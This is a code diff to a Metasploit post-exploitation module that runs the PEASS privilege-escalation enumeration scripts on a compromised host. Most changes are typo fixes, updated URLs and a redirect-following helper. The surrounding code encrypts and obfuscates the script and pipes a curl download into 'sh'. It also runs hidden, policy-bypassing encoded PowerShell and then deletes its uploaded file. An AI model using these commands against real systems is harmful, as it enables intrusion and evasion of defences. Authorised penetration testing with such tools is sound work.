@@ -18,26 +18,26 @@ class MetasploitModule < Msf::Post
       'Name'           => 'Multi PEASS launcher',
       'Description'    => %q{
           This module will launch the indicated PEASS (Privilege Escalation Awesome Script Suite) script to enumerate the system.
-          You need to indicate the URL or local path to LinPEAS if you are in some Unix or to WinPEAS if you are in Windows.
+          You need to indicate the URL or local path to LinPEAS if you are on any Unix-based system or to WinPEAS if you are on Windows.
           By default this script will upload the PEASS script to the host (encrypted and/or encoded) and will load, deobfuscate, and execute it.
           You can configure this module to download the encrypted/encoded PEASS script from this metasploit instance via HTTP instead of uploading it.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Carlos Polop <@carlospolopm>'
+          'Carlos Polop <@hacktricks_live>'
         ],
       'Platform'       => %w{ bsd linux osx unix win },
       'SessionTypes'   => ['shell', 'meterpreter'],
       'References' =>
           [
-            ['URL', 'https://github.com/carlospolop/PEASS-ng'],
+            ['URL', 'https://github.com/peass-ng/PEASS-ng'],
             ['URL', 'https://www.youtube.com/watch?v=9_fJv_weLU0'],
           ]
     ))
     register_options(
       [
-        OptString.new('PEASS_URL', [true, 'Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"]),
+        OptString.new('PEASS_URL', [true, 'Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"]),
         OptString.new('PASSWORD', [false, 'Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used.', rand(36**32).to_s(36)]),
         OptString.new('TEMP_DIR', [false, 'Path to upload the obfuscated PEASS script inside the compromised machine. By default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp" in Unix.', '']),
         OptString.new('PARAMETERS', [false, 'Parameters to pass to the script', nil]),
@@ -52,18 +52,18 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    ps_var1 = rand(36**5).to_s(36) #Winpeas PS needed variable
+    ps_var1 = rand(36**5).to_s(36) # Winpeas PS needed variable
 
     # Load PEASS script in memory
     peass_script = load_peass()
-    print_good("PEASS script successfully retreived.")
+    print_good("PEASS script successfully retrieved.")
 
     # Obfuscate loaded PEASS script
     if datastore["PASSWORD"].length > 1
       # If no Windows, check if openssl exists
       if !session.platform.include?("win")
         openssl_path = cmd_exec("command -v openssl")
-        raise 'openssl not found in victim, unset the password of the module!' unless openssl_path.include?("openssl")
+        raise 'openssl not found on victim, unset the password of the module!' unless openssl_path.include?("openssl")
       end
 
       # Get encrypted PEASS script in B64
@@ -82,7 +82,7 @@ class MetasploitModule < Msf::Post
         # As the PS function is only capable of decrypting readable strings
         # in Windows we encrypt the B64 of the binary and then load it in memory 
         # from the initial B64. Then: original -> B64 -> encrypt -> B64
-        aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) #Base64 before encrypting it
+        aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) # Base64 before encrypting it
         peass_script_64 = aes_enc_peass_ret["encrypted"]
         key_b64 = aes_enc_peass_ret["key_b64"]
         iv_b64 = aes_enc_peass_ret["iv_b64"]
@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Post
       # If no Windows, check if base64 exists
       if !session.platform.include?("win")
         base64_path = cmd_exec("command -v base64")
-        raise 'base64 not found in victim, set a 32B length password!' unless base64_path.include?("base64")
+        raise 'base64 not found on victim, set a 32B length password!' unless base64_path.include?("base64")
       end
 
       # Encode PEASS script
@@ -137,7 +137,7 @@ class MetasploitModule < Msf::Post
       upload_file(temp_path, file.path)
       print_good("Uploaded")
 
-      #Start the cmd, prepare to read from the uploaded file
+      # Start the cmd, prepare to read from the uploaded file
       if session.platform.include?("win")
         cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Get-Content -Path #{temp_path};"
         last_cmd = "del #{temp_path};"
@@ -146,7 +146,7 @@ class MetasploitModule < Msf::Post
         last_cmd = " ; rm #{temp_path}"
       end
 
-    # Instead of writting the file to disk, download it from HTTP
+    # Instead of writing the file to disk, download it from HTTP
     else
       last_cmd = ""
       # Start HTTP server
@@ -159,13 +159,13 @@ class MetasploitModule < Msf::Post
       url_download_peass = http_protocol + http_ip + http_port + http_path      
       print_good("Listening in #{url_download_peass}")
       
-      # Configure the download of the scrip in Windows
+      # Configure the download of the script in Windows
       if session.platform.include?("win")
         cmd = "$ProgressPreference = 'SilentlyContinue';"
         cmd += get_bypass_tls_cert()
         cmd += "$#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"
       
-      # Configure the download of the scrip in unix
+      # Configure the download of the script in Unix
       else
         cmd = "curl -k -s \"#{url_download_peass}\""
         curl_path = cmd_exec("command -v curl")
@@ -191,14 +191,14 @@ class MetasploitModule < Msf::Post
         cmd_utf16le = cmd.encode("utf-16le")
         cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, "")
         
-        tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"])
+        tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"].to_i)
       
-        # If unix, then, suppose linpeas was loaded
+        # If Unix, then, suppose linpeas was loaded
       else
         cmd += "| #{decode_linpeass_cmd}"
         cmd += "| sh -s -- #{datastore['PARAMETERS']}"
         cmd += last_cmd
-        tmpout << cmd_exec(cmd, args=nil, time_out=datastore["TIMEOUT"])
+        tmpout << cmd_exec(cmd, args=nil, time_out=datastore["TIMEOUT"].to_i)
       end
 
       print "\n#{tmpout}\n\n"
@@ -220,6 +220,20 @@ class MetasploitModule < Msf::Post
     print_good("PEASS script sent")
   end
 
+  def fetch(uri_str, limit = 10)
+    raise 'Invalid URL, too many HTTP redirects' if limit == 0
+    response = Net::HTTP.get_response(URI(uri_str))
+    case response
+    when Net::HTTPSuccess then
+      response
+    when Net::HTTPRedirection then
+      location = response['location']
+      fetch(location, limit - 1)
+    else
+      response.value
+    end
+  end
+ 
   def load_peass
     # Load the PEASS script from a local file or from Internet
     peass_script = ""
@@ -230,7 +244,7 @@ class MetasploitModule < Msf::Post
       raise 'Invalid URL' unless target.scheme =~ /https?/
       raise 'Invalid URL' if target.host.to_s.eql? ''
       
-      res = Net::HTTP.get_response(target)
+      res = fetch(target)
       peass_script = res.body
 
       raise "Something failed downloading PEASS script from #{url_peass}" if peass_script.length < 500
@@ -245,7 +259,7 @@ class MetasploitModule < Msf::Post
   end
 
   def aes_enc_peass(peass_script)
-    # Encrypt the PEASS script with aes
+    # Encrypt the PEASS script with AES (CBC Mode)
     key = datastore["PASSWORD"]
     iv = OpenSSL::Cipher::Cipher.new('aes-256-cbc').random_iv
     
@@ -319,7 +333,7 @@ function DecryptStringFromBytesAes([String] $key, [String] $iv, [String] $encryp
         $csDecrypt = new-object System.Security.Cryptography.CryptoStream($msDecrypt, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
         $srDecrypt = new-object System.IO.StreamReader($csDecrypt)
 
-        #Write all data to the stream.
+        # Write all data to the stream.
         $plainText = $srDecrypt.ReadToEnd()
         $srDecrypt.Close()
         $csDecrypt.Close()
